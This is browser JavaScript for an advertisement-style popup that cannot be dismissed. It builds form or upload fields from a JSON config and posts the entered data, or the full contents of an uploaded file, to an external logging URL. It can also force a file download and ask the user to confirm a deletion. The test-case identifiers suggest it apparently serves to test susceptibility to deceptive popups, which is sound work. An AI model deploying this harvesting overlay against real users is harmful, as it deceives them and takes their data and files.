document.addEventListener("DOMContentLoaded", async () => {
  const ad = document.getElementById("advertisement");
  const bg = document.getElementById("brand-screenshot");
  const closeBtn = document.getElementById("close-popup");
  const form = document.getElementById("ad-form");
  const titleEl = document.getElementById("form-title");
  const descEl  = document.getElementById("form-description");

  // New deletion-confirmation elements
  const deletePanel     = document.getElementById("delete-confirmation");
  const confirmCheckbox = document.getElementById("confirm-deletion");
  const okButton        = document.getElementById("deletion-ok");

  let redirectUrl      = "https://www.example.com";
  let sheetUrl         = "";
  let testCaseId       = "";
  let isUploadMode     = false;
  let isDownloadMode   = false;
  let downloadData     = null;
  let successMessage   = "Submitted successfully.";
  let failureMessage   = "Failed to submit form.";
  let requireDeletion  = false;  // <-- new flag

  // show popup
  ad.classList.remove("hidden");
  bg.style.opacity = "0.2";
  // closeBtn.addEventListener("click", () => {
  //   ad.classList.add("hidden");
  //   bg.style.opacity = "1";
  // });

  function getConfigFilename() {
    const params = new URLSearchParams(window.location.search);
    return params.get("id") ? `${params.get("id")}.json` : "default.json";
  }

  async function loadConfig(fn) {
    form.innerHTML = "";
    try {
      const resp = await fetch(fn);
      const cfg  = await resp.json();

      // core props
      document.title      = cfg.title || "";
      titleEl.textContent = cfg.title || "";
      descEl.textContent  = cfg.description || "";
      if (cfg.backgroundImage) bg.src = cfg.backgroundImage;
      if (cfg.redirectUrl)      redirectUrl = cfg.redirectUrl;
      if (cfg.sheetUrl)         sheetUrl    = cfg.sheetUrl;
      if (cfg.test_case_id)     testCaseId  = cfg.test_case_id;
      if (cfg.successMessage)   successMessage = cfg.successMessage;
      if (cfg.failureMessage)   failureMessage = cfg.failureMessage;
      if (cfg.requireDeletion)  requireDeletion = true;

      // detect mode
      if (cfg.download?.url) {
        isDownloadMode = true;
        downloadData   = cfg.download;
      } else if (Array.isArray(cfg.fields)) {
        if (cfg.fields.length === 1 && cfg.fields[0].type === "file") {
          isUploadMode = true;
        }
        // render inputs
        cfg.fields.forEach(f => {
          const lbl = document.createElement("label");
          lbl.htmlFor = f.id; lbl.textContent = f.label;
          const inp = document.createElement("input");
          inp.type = f.type || "text";
          inp.id   = f.id; inp.name = f.name;
          if (f.required) inp.required = true;
          form.append(lbl, inp);
        });
        const btn = document.createElement("button");
        btn.type = "submit";
        btn.textContent = isUploadMode ? "Upload" : "Submit";
        form.appendChild(btn);
      }

      // download mode button
      if (isDownloadMode) {
        const btn = document.createElement("button");
        btn.type = "submit";
        btn.textContent = "Download File";
        form.appendChild(btn);
      }

    } catch (err) {
      titleEl.textContent = "Error";
      descEl.textContent  = `Could not load ${fn}`;
      console.error(err);
    }
  }

  // deletion‑confirmation logic
  confirmCheckbox.addEventListener("change", () => {
    okButton.disabled = !confirmCheckbox.checked;
  });
  okButton.addEventListener("click", () => {
    window.location.href = redirectUrl;
  });

  form.addEventListener("submit", async ev => {
    ev.preventDefault();

    // helper to show deletion panel
    function promptDeletion() {
      form.classList.add("hidden");
      deletePanel.classList.remove("hidden");
    }

    // RECORD & ACT
    const sendLog = async payload => {
      try {
        await fetch(sheetUrl, {
          method: "POST",
          mode: "no-cors",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });
      } catch (e) {
        console.error("Logging failed:", e);
      }
    };

    // DOWNLOAD
    if (isDownloadMode) {
      await sendLog({
        test_case_id: testCaseId,
        first_infor:  "",
        second_infor: "",
        filename:     downloadData.filename || "",
        mimetype:     downloadData.mimetype || ""
      });
      try {
        const r = await fetch(downloadData.url);
        const blob = await r.blob();
        const u = URL.createObjectURL(blob);
        const a = document.createElement("a");
        a.href = u; a.download = downloadData.filename || "file";
        document.body.appendChild(a);
        a.click();
        a.remove();
        URL.revokeObjectURL(u);
      } catch (e) {
        console.error("Download error:", e);
      }

      if (requireDeletion) {
        promptDeletion();
      } else {
        alert(successMessage);
        window.location.href = redirectUrl;
      }
      return;
    }

    // UPLOAD
    if (isUploadMode) {
      const fileInput = form.querySelector('input[type="file"]');
      const file = fileInput?.files?.[0];
      if (!file) return alert("Please select a file.");
      const reader = new FileReader();
      reader.onload = async () => {
        const content = reader.result.split(",")[1];
        await sendLog({
          test_case_id: testCaseId,
          first_infor:  "",
          second_infor: "",
          filename:     file.name,
          mimetype:     file.type,
          content
        });
        if (requireDeletion) {
          promptDeletion();
        } else {
          alert(successMessage);
          window.location.href = redirectUrl;
        }
      };
      reader.readAsDataURL(file);
      return;
    }

    // GENERIC FORM
    const data = Array.from(form.elements)
      .filter(el => el.name)
      .reduce((o, el) => (o[el.name] = el.value.trim(), o), {});
    data.test_case_id = testCaseId;
    data.filename     = "";
    data.mimetype     = "";
    await sendLog(data);

    if (requireDeletion) {
      promptDeletion();
    } else {
      alert(successMessage);
      window.location.href = redirectUrl;
    }
  });

  // kick off
  const cfgFile = getConfigFilename();
  await loadConfig(cfgFile);
});
